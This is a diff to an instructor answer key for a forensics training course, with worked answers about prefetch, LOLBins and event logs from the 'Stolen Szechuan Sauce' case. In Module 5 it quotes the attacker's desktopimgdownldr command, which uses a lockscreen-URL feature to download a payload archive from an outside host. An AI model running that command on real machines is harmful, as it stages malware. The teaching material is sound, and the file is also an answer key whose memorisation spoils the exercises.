@@ -2,7 +2,7 @@
 
 > **⚠️ Instructor / self-check material — spoilers ahead.** Each module's README keeps its "what to find" section deliberately light so learners discover the answers themselves. This file consolidates the *try-it-yourself* exercises from all modules with **worked answers grounded in the real bundled data**. Try every exercise first; read this only to check.
 >
-> Command-based answers were verified by running the tool in the **`dfir-aio:v2`** container against each module's `data/` folder. Real values (hashes, timestamps, event-ID counts) are quoted from that data; where a value is a reasoning point rather than a fixed output, the answer explains the principle.
+> Command-based answers were verified by running each tool on the lab VM against each module's `data/` folder. Real values (hashes, timestamps, event-ID counts) are quoted from that data; where a value is a reasoning point rather than a fixed output, the answer explains the principle.
 
 **Shared facts about the Part A host** (used across Modules 1-4): host `DESKTOP-SDN1RPT`, from DFIR Madness *Case 001 — "The Stolen Szechuan Sauce."* The case malware is `coreupdater.exe`:
 - **SHA1** `fd153c66386ca93ec9993d66a84d6f0d129a3a5c`
@@ -23,10 +23,10 @@ All four LOLBins are present, and several cluster in the **2020-09-19 early-morn
 Yes — `cmd`, `rundll32`, and (slightly later) `powershell` all cluster in the 03:13-05:09 window of 2020-09-19, the same window in which `coreupdater.exe` ran.
 
 **2. Inspect the malware's loaded files.**
-`prefetch /data/prefetch/COREUPDATER.EXE-157C54BB.pf` shows RunCount **1**, last run **2020-09-19 03:40:49.410 UTC**, and **51 filenames loaded**. The point of the exercise is to read that Filenames list for any path under `\Temp\`, `\AppData\`, `\Users\Public\`, or other non-System32 locations — a DLL or data file loaded from a user-writable folder is a side-loading / staging red flag. (The binary itself lives in `System32`, the masquerade; you confirm its identity by SHA1 in Module 3.)
+`prefetch prefetch/COREUPDATER.EXE-157C54BB.pf` shows RunCount **1**, last run **2020-09-19 03:40:49.410 UTC**, and **51 filenames loaded**. The point of the exercise is to read that Filenames list for any path under `\Temp\`, `\AppData\`, `\Users\Public\`, or other non-System32 locations — a DLL or data file loaded from a user-writable folder is a side-loading / staging red flag. (The binary itself lives in `System32`, the masquerade; you confirm its identity by SHA1 in Module 3.)
 
 **3. Meet a real corrupt artifact.**
-Running `prefetch /data/prefetch/VSSVC.EXE-6C8F0C66.pf` *without* `2>/dev/null` prints a **libscca read error** — the file is genuinely corrupt. In the Step-2 loop, `2>/dev/null` sent that error to the trash so the other 196 files still summarised. Correct real-world handling: **document the damaged artifact (name it, note it's unreadable) and move on** — one bad file doesn't stop the case. 196 of 197 parse cleanly.
+Running `prefetch prefetch/VSSVC.EXE-6C8F0C66.pf` *without* `2>/dev/null` prints a **libscca read error** — the file is genuinely corrupt. In the Step-2 loop, `2>/dev/null` sent that error to the trash so the other 196 files still summarised. Correct real-world handling: **document the damaged artifact (name it, note it's unreadable) and move on** — one bad file doesn't stop the case. 196 of 197 parse cleanly.
 
 **4. Run-count reasoning.**
 Any program whose `RunCount` exceeds the number of *real* (non-`1601-01-01`) timestamps in `AllRunTimes`. Example from `pf.csv`: `CMD.EXE` shows RunCount **9** but only **8** timestamp slots exist. **Why:** Prefetch stores only the **last 8 run times**; a program run more than 8 times keeps an accurate *count* but has lost the older timestamps (and unused slots read as the epoch `1601-01-01 00:00:00`).
@@ -104,7 +104,7 @@ Copying a `WORKSTATION` CSV in as a fourth host and re-running Stack 1 makes a s
 ## Module 5 — Event logs (EvtxECmd)
 
 **1. The 3-line story (sorted timeline).**
-After `EvtxECmd -d /data --csv ...` and sorting by `TimeCreated`, the desktopimgdownldr attack reads: (1) `desktopimgdownldr.exe` is launched (Sysmon 1) with `/lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr` — a LOLBAS abusing a lockscreen-image feature to download; (2) the **BITS** service actually performs the fetch (BITS-Client 59/60); (3) a `.7z` archive lands on disk — staging for the next stage. The same URL appears in two channels.
+After `EvtxECmd -d . --csv ...` and sorting by `TimeCreated`, the desktopimgdownldr attack reads: (1) `desktopimgdownldr.exe` is launched (Sysmon 1) with `/lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr` — a LOLBAS abusing a lockscreen-image feature to download; (2) the **BITS** service actually performs the fetch (BITS-Client 59/60); (3) a `.7z` archive lands on disk — staging for the next stage. The same URL appears in two channels.
 
 **2. Grep for the hostname.**
 `grep -i uguu.se events.csv` → the host `a.uguu.se` appears in **two channels** — the **Sysmon 1** command line *and* the **BITS** job. Corroboration across logs is stronger than one hit because a single source can be disabled, cleared, or spoofed; two independent records of the same download make the finding very hard to dispute. (Verified: the command line is `desktopimgdownldr.exe /lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr`.)
